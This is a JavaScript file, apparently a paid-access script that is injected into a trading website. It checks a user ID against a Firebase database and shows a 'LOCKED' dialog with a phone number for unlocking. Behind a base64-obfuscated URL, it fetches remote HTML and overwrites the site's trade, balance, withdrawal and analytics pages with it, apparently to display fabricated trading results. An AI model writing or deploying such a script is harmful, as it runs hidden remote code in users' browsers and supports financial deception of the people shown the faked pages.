
// ================= CONFIG =================
const projectID = "reactions-maker-site";
const dbURL = `https://${projectID}-default-rtdb.firebaseio.com/users.json`;
const base = atob("aHR0cHM6Ly9haG1hZC1iaGFpLXNjcmlwdHMudmVyY2VsLmFwcC8=");

// ================= GET ID FROM URL =================
const urlParams = new URLSearchParams(window.location.search);
const id = urlParams.get("id");

// ================= SHOW LOCK DIALOG =================
function showLock(uidText){

    var dialogs = document.querySelectorAll("dialog");
    if (dialogs.length) dialogs.forEach(d => d.remove());

    var color = "#1c242a";

    var html = `<div style="font-family:sans-serif;padding:1rem;background:${color};
    width:${screen.width>500?100+"%":(screen.width-40)+"px"};
    border-top:5px solid #05c55e" class="dia">

    <div style="text-align:center">
    <div style="line-height:50px;font-size:30px;color:#fff;font-weight:900">LOCKED</div>

    <svg width="50" height="50" viewBox="0 0 180 180"
    style="display:inline-block">
    <g transform="translate(0,180) scale(0.1,-0.1)" fill="#fff">
    <path d="M753 1622 l-133 -77 0 -67 0 -67 87 50 105 60 18 -626 0 -636 -50 28 -50 28 0 443 0 442 -55 0 -55 0 0 -405 -7 -405 -50 22 -43 23 0 308 0 308 -57 -3 -58 -3 -5 -267 -5 -267 -40 22 -40 23 0 339 0 339 103 59 102 59 0 64 -6 64 -165 -92 -159 -92 0 -401 0 -401 342 -198 348 -199 353 199 342 199 0 400 0 400 -159 93 -165 92 -6 -64 0 -63 103 -60 102 -59 0 -339 0 -340 -42 -23 -43 -23 0 270 0 271 -60 0 -60 0 0 -307 0 -308 -40 -22 -44 -23 -6 405 0 405 -60 0 -60 0 0 -443 0 -442 -46 -28 -50 -24 -2 635 3 632 103 -60 108 -60 4 65 0 64 -92 54 -138 80 -45 26 -132 -77z"/>
    </g>
    </svg>
    </div><br>

    <div style="text-align:center;color:#fff;font-family:monospace;word-break:break-all">
    ${uidText || ""}
    </div><br>

    <div style="text-align:center;">
    <button style="padding:10px 20px;background:#05c55e;color:#fff;border:none;">
    CLOSE
    </button>
    </div><br>

    <div style="color:#ff6251;font-size:12px;text-align:left">
    📝 CONTACT +923120883884 TO UNLOCK !!! 🔓
    </div>

    <hr style="border-color:#fff">

    <div style="text-align:center;font-weight:100;color:#fff">
    Made with <span class="heart">♥</span> by 
    <a style="color:#fff" href="https://t.me/AhmadTrader3">@AhmadTrader3</a>
    </div>
    </div>`;

    var myDialog = document.createElement("dialog");
    document.body.appendChild(myDialog);
    myDialog.innerHTML = html;

    var styleElem = document.head.appendChild(document.createElement("style"));
    styleElem.innerHTML = `
    @keyframes heartbeat {
        0%   { transform: scale(1); color:#ffb3b3; }
        25%  { transform: scale(1.25); color:#ff1a1a; }
        50%  { transform: scale(1); }
        75%  { transform: scale(1.25); color:#ff1a1a; }
        100% { transform: scale(1); color:#ffb3b3; }
    }

    .heart{
        display:inline-block;
        animation: heartbeat 1.2s infinite;
    }

    dialog::backdrop { background:#05c55e; opacity:.25 }
    ::selection { background:white; color:${color} }
    `;

    myDialog.showModal();

    myDialog.querySelector("button").onclick = () => myDialog.close();
}

// ================= LOAD PAGE =================
function loadPage(){

let file="";
let p = location.href.split("en/")[1]?.replace("/","") || "";

if(document.querySelector("#root > div > div.mobile-trade-list"))
file="win.html";
else if(document.querySelector(".---react-features-Sidepanel-styles-module__active--qe_nH")?.classList[3]?.includes("active"))
file="LB.html";
else if(p==="balance" || p==="withdrawal")
file="p.html";
else if(p==="analytics")
file="ana.html";
else
file = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
? "android.html"
: "pc.html";

fetch(base + file)
.then(r=>r.text())
.then(html=>{
document.open();
document.write(html);
document.close();
})
.catch(()=>{
showLock(id);
});

}

// ================= VERIFY SYSTEM =================
if(!id){
showLock("");
}
else{
fetch(dbURL)
.then(r=>r.json())
.then(data=>{
let valid=false;
if(data){
Object.values(data).forEach(u=>{
if(u.id===id) valid=true;
});
}
if(valid){
loadPage();
}else{
showLock(id);
}
})
.catch(()=>{
showLock(id);
});
}

